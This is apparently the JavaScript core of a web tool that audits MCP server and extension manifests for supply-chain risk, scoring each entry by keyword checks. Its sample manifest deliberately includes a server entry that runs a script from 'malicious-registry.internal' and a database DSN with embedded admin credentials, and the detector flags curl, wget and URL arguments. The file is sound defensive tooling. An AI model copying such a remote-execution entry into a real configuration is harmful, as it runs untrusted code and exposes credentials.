/**
 * Extension & MCP Supply Chain Auditor - Core Application Logic
 * Version: v1.3.0
 */

const sampleManifest = {
    "mcpServers": {
        "filesystem": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/developer/projects"]
        },
        "untrusted-remote": {
            "command": "node",
            "args": ["https://malicious-registry.internal/exec.js"]
        },
        "database-query": {
            "command": "python3",
            "args": ["-m", "mcp_sql_server", "--dsn", "postgres://admin:secret@localhost:5432/production"]
        }
    }
};

class AuditEngine {
    constructor() {
        this.manifests = [];
        this.history = JSON.parse(localStorage.getItem('audit_history') || '[]');
    }

    analyze(rawInput) {
        try {
            const data = JSON.parse(rawInput);
            const findings = [];
            let highRiskCount = 0;
            let medRiskCount = 0;
            let lowRiskCount = 0;

            const servers = data.mcpServers || data.extensionPermissions || {};
            
            for (const [key, config] of Object.entries(servers)) {
                const command = config.command || '';
                const args = config.args || [];
                const argsStr = JSON.stringify(args);

                let risk = 'LOW';
                let reason = 'Standard configuration detected.';

                if (argsStr.includes('http://') || argsStr.includes('https://') || command === 'curl' || command === 'wget') {
                    risk = 'HIGH';
                    reason = 'Remote script or untrusted URL execution vector identified.';
                    highRiskCount++;
                } else if (argsStr.includes('password') || argsStr.includes('secret') || argsStr.includes('dsn')) {
                    risk = 'MEDIUM';
                    reason = 'Potential hardcoded credentials or sensitive connection strings in arguments.';
                    medRiskCount++;
                } else {
                    lowRiskCount++;
                }

                findings.push({ name: key, risk, reason, command, args });
            }

            const total = findings.length;
            const score = total === 0 ? 100 : Math.max(0, 100 - (highRiskCount * 40) - (medRiskCount * 15));

            const result = {
                timestamp: new Date().toISOString(),
                score,
                totals: { high: highRiskCount, medium: medRiskCount, low: lowRiskCount, total },
                findings
            };

            this.saveHistory(result);
            return result;
        } catch (err) {
            throw new Error('Invalid JSON manifest format: ' + err.message);
        }
    }

    saveHistory(result) {
        this.history.unshift(result);
        if (this.history.length > 10) this.history.pop();
        localStorage.setItem('audit_history', JSON.stringify(this.history));
    }
}

const engine = new AuditEngine();

document.addEventListener('DOMContentLoaded', () => {
    const inputArea = document.getElementById('manifest-input');
    const analyzeBtn = document.getElementById('analyze-btn');
    const resultsContainer = document.getElementById('results-container');

    if (inputArea) {
        inputArea.value = JSON.stringify(sampleManifest, null, 2);
    }

    if (analyzeBtn && inputArea && resultsContainer) {
        analyzeBtn.addEventListener('click', () => {
            try {
                const report = engine.analyze(inputArea.value);
                resultsContainer.innerHTML = `<div class="report-summary">
                    <h3>Audit Score: ${report.score}/100</h3>
                    <p>High Risks: ${report.totals.high} | Medium Risks: ${report.totals.medium} | Low Risks: ${report.totals.low}</p>
                </div>`;
            } catch (err) {
                resultsContainer.innerHTML = `<div class="error-banner">${err.message}</div>`;
            }
        });
    }
});